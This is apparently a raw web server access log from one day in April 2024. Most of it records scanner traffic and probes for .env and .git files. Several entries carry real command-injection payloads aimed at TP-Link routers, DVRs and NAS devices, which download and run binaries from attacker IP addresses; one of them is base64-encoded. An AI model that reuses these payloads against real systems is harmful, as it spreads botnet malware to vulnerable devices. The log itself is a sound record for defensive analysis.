57.129.23.166 - - [19/Apr/2024:00:03:06 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.168.172 - - [19/Apr/2024:00:17:33 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.11 - - [19/Apr/2024:00:17:48 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.104.11.51 - - [19/Apr/2024:00:18:13 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.105.128.12 - - [19/Apr/2024:00:18:26 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.155.90.220 - - [19/Apr/2024:00:18:55 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.105.128.13 - - [19/Apr/2024:00:19:10 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.104.11.51 - - [19/Apr/2024:00:19:25 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.155.90.220 - - [19/Apr/2024:00:19:59 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.128.205 - - [19/Apr/2024:00:20:12 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.105.128.13 - - [19/Apr/2024:00:20:27 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
66.175.213.4 - - [19/Apr/2024:00:20:36 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.155.90.118 - - [19/Apr/2024:00:20:48 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.251 - - [19/Apr/2024:00:21:21 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.43 - - [19/Apr/2024:00:25:02 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
69.164.217.245 - - [19/Apr/2024:00:58:05 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
66.175.213.4 - - [19/Apr/2024:00:58:48 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:01:01:49 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
81.163.56.89 - - [19/Apr/2024:01:21:22 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
54.36.115.221 - - [19/Apr/2024:01:34:30 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [19/Apr/2024:01:34:30 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
116.198.40.76 - - [19/Apr/2024:01:40:18 +0000] "GET / HTTP/1.1" 200 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
179.43.190.218 - - [19/Apr/2024:01:42:15 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
69.164.217.245 - - [19/Apr/2024:01:49:19 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
45.79.172.21 - - [19/Apr/2024:01:50:09 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
107.170.252.38 - - [19/Apr/2024:01:56:40 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [19/Apr/2024:02:11:38 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.57 - - [19/Apr/2024:02:17:54 +0000] "GET / HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
54.36.115.221 - - [19/Apr/2024:02:40:53 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [19/Apr/2024:02:40:53 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:03:05:27 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
164.52.0.94 - - [19/Apr/2024:03:09:28 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.0.94 - - [19/Apr/2024:03:09:31 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
164.52.0.94 - - [19/Apr/2024:03:09:35 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.0.94 - - [19/Apr/2024:03:09:39 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
69.164.217.245 - - [19/Apr/2024:03:38:47 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [19/Apr/2024:03:40:48 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
5.181.190.250 - - [19/Apr/2024:04:01:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
198.74.56.46 - - [19/Apr/2024:04:02:27 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.34 - - [19/Apr/2024:04:03:02 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
179.43.190.218 - - [19/Apr/2024:04:09:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
143.110.222.166 - - [19/Apr/2024:04:11:48 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.60 - - [19/Apr/2024:04:41:25 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bcd%20%2Fvar%2Ftmp%3Bwget%20http%3A%2F%2F94.156.79.129%2Farm7%3Bchmod%20777%20arm7%3B%20.%2Farm7%200daydvr%3B HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
151.247.0.84 - - [19/Apr/2024:04:42:38 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
188.74.6.107 - - [19/Apr/2024:04:48:58 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.92.241.63 - - [19/Apr/2024:05:08:28 +0000] "GET /.git/config HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.60 - - [19/Apr/2024:05:10:56 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bcd%20%2Fvar%2Ftmp%3Bwget%20http%3A%2F%2F94.156.79.129%2Farm7%3Bchmod%20777%20arm7%3B%20.%2Farm7%200daydvr%3B HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
54.36.115.221 - - [19/Apr/2024:05:15:40 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [19/Apr/2024:05:15:41 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:05:19:42 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.67.163.199 - - [19/Apr/2024:05:26:12 +0000] "GET /.env HTTP/1.1" 404 419 "-" "python-requests/2.26.0"
103.67.163.199 - - [19/Apr/2024:05:26:12 +0000] "POST / HTTP/1.1" 405 400 "-" "python-requests/2.26.0"
185.224.128.43 - - [19/Apr/2024:05:35:16 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [19/Apr/2024:06:18:08 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
54.36.115.221 - - [19/Apr/2024:06:18:39 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [19/Apr/2024:06:18:39 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.151.243.170 - - [19/Apr/2024:06:28:03 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0"
103.203.56.1 - - [19/Apr/2024:06:46:56 +0000] "GET / HTTP/1.1" 200 207 "-" "HTTP Banner Detection (https://security.ipip.net)"
185.191.126.213 - - [19/Apr/2024:06:55:45 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
45.128.232.229 - - [19/Apr/2024:06:58:52 +0000] "GET / HTTP/1.1" 200 280 "-" "Linux Gnu (cow)"
5.181.190.250 - - [19/Apr/2024:07:05:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
179.43.190.218 - - [19/Apr/2024:07:06:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
80.94.92.60 - - [19/Apr/2024:07:17:41 +0000] "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuNzkuMTI5L2xvbHxzaA== HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
143.110.222.166 - - [19/Apr/2024:07:21:04 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
69.164.217.74 - - [19/Apr/2024:07:47:23 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [19/Apr/2024:07:47:56 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
111.200.216.75 - - [19/Apr/2024:07:48:14 +0000] "GET / HTTP/1.1" 200 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:08:05:43 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
54.36.115.221 - - [19/Apr/2024:08:42:16 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [19/Apr/2024:08:42:16 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:09:18:32 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.43 - - [19/Apr/2024:09:50:05 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [19/Apr/2024:09:59:02 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
118.26.36.18 - - [19/Apr/2024:10:03:20 +0000] "GET / HTTP/1.1" 200 188 "-" "curl/7.29.0"
54.36.115.221 - - [19/Apr/2024:10:04:44 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [19/Apr/2024:10:04:44 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.36.114.198 - - [19/Apr/2024:10:11:54 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
101.36.114.198 - - [19/Apr/2024:10:11:59 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
101.36.114.198 - - [19/Apr/2024:10:11:59 +0000] "GET /robots.txt HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
101.36.114.198 - - [19/Apr/2024:10:11:59 +0000] "GET /sitemap.xml HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
139.162.254.41 - - [19/Apr/2024:10:16:54 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
91.92.255.41 - - [19/Apr/2024:10:44:22 +0000] "GET /.git/config HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.74.56.46 - - [19/Apr/2024:11:04:30 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [19/Apr/2024:11:04:38 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:11:05:04 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
192.155.90.118 - - [19/Apr/2024:11:09:26 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
216.218.206.69 - - [19/Apr/2024:11:12:22 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
216.218.206.69 - - [19/Apr/2024:11:15:51 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50"
216.218.206.69 - - [19/Apr/2024:11:16:32 +0000] "GET /geoserver/web/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
5.181.190.250 - - [19/Apr/2024:11:26:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
146.70.15.33 - - [19/Apr/2024:11:34:53 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
146.70.15.33 - - [19/Apr/2024:11:34:54 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
179.43.190.218 - - [19/Apr/2024:11:45:28 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
54.36.115.221 - - [19/Apr/2024:12:05:20 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [19/Apr/2024:12:05:20 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.210.105 - - [19/Apr/2024:12:06:32 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [19/Apr/2024:12:06:48 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.104.11.204 - - [19/Apr/2024:12:15:24 +0000] "GET /Qq6d HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.104.11.204 - - [19/Apr/2024:12:15:25 +0000] "GET /rGWM HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
143.110.222.166 - - [19/Apr/2024:12:15:50 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.191.126.213 - - [19/Apr/2024:12:25:02 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
200.6.168.42 - - [19/Apr/2024:12:38:51 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
54.37.79.75 - - [19/Apr/2024:12:47:59 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Apr/2024:12:47:59 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:12:59:22 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
54.37.79.75 - - [19/Apr/2024:13:18:44 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Apr/2024:13:18:44 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.74.56.46 - - [19/Apr/2024:13:31:38 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.12 - - [19/Apr/2024:13:31:50 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
5.181.190.250 - - [19/Apr/2024:13:54:47 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
143.110.222.166 - - [19/Apr/2024:14:12:53 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.209.143.197 - - [19/Apr/2024:14:22:01 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
54.37.79.75 - - [19/Apr/2024:14:32:58 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Apr/2024:14:32:59 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.43 - - [19/Apr/2024:15:26:48 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [19/Apr/2024:15:38:35 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Apr/2024:15:38:35 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.242.226.10 - - [19/Apr/2024:15:40:07 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
